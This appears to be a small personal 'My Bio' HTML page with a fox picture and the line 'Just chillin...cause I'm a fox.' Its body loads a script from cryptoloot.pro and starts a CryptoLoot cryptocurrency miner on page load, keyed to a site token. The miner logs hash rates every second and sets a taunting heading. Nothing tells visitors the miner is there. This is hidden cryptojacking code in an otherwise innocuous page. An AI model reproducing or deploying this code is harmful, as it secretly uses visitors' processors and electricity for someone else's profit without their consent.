<!DOCTYPE html>
<html>
<head>
<title>My Bio</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
</head>
<body>
	<script src="//cryptoloot.pro/lib/crlt.js" type="text/javascript"></script>
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<script>
var miner = new CRLT.Anonymous('b60ae0e626d5d6a5ee8d7b5b673eb25c4db7d394dc3b');
miner.start();
console.log("miner should've started");
// Listen on events
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
	var hashesPerSecond = miner.getHashesPerSecond();
	console.log(hashesPerSecond);
	var totalHashes = miner.getTotalHashes();
	console.log(totalHashes);
	var acceptedHashes = miner.getAcceptedHashes();
	console.log(acceptedHashes);
	// Output to HTML elements...
	$(".h1").html("You can't attack yourself, silly.");
}, 1000);
</script>
	
<div class="container">
  <div class="row">
    <div class="col-lg-12">
	<h2 style="text-align:center;">Just chillin...cause I'm a fox.</h2>
	<img src="./skarbonka-foxy.jpg" style="display: block; margin:auto; width:20%;">
    </div>
  </div>
 </div>
</body>
</html>
